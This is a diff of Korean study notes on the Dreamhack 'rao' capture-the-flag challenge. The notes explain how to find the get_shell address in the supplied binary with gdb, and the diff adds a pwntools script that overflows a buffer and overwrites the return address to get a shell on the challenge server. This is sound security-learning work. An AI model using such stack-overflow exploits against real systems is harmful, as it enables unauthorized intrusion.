@@ -41,12 +41,32 @@ int main() {
      - $ gdb ./rao    // 가상 환경에서 rao파일을 로드한다.
      - $ p &get_shell  // get_shell의 시작 주소를 확인한다. 또는  $ info address get_shell 명령어를 사용해도 좋다.
      -  ~~0x4011dd  라는 주소가 나왔다.~~
-      
-    
-      
-    
-  4) 리틀 엔디언 형식으로 바꾸기
-     - 64비트 아키텍처에서는 주소는 8바이트로 표현된다. 때문에 리틀 엔디언 형식으로 변경하면 \xdd\x11\x40\x00\x00\x00\x00\x00 와 같다.
+
+     - 주소가 잘못되었다. 내가 직접 컴파일한 바이너리가 서버에 있는 바이너리와 동일하다는 보장이 없다. **즉, 컴파일 환경과 실행 환경에 따라 함수의 주소가 달라질 수 있다**. 문제에서 바이너리도 함께 주는 데 이 파일을 사용해야 한다...
+
+     - gdb를 활용해 주어진 바이너리를 디버깅한다. p get_shell 로 심볼 테이블 조회를 한 결과 0x4006aa라는 주소를 알아냈다.
+       
     
   5) 익스플로잇 하기
-     - 
+     - 페이로드 파일을 만들자.
+       ```
+       from pwn import *
+        
+        # 외부 서버 정보
+        host = "host3.dreamhack.games"  # 예: "host3.dreamhack.games"
+        port = 11480  # 해당 서버의 포트 번호
+        
+        # 페이로드 생성
+        payload = b"A" * 0x30  # 버퍼 크기
+        payload += b"B" * 0x8  # rbp 덮기
+        payload += p64(0x4006aa)  # get_shell 함수 주소
+        
+        # 서버와 연결
+        p = remote(host, port)
+        
+        # 페이로드 전송
+        p.sendline(payload)
+        
+        # 상호작용 모드 (쉘 확인)
+        p.interactive()
+       ```
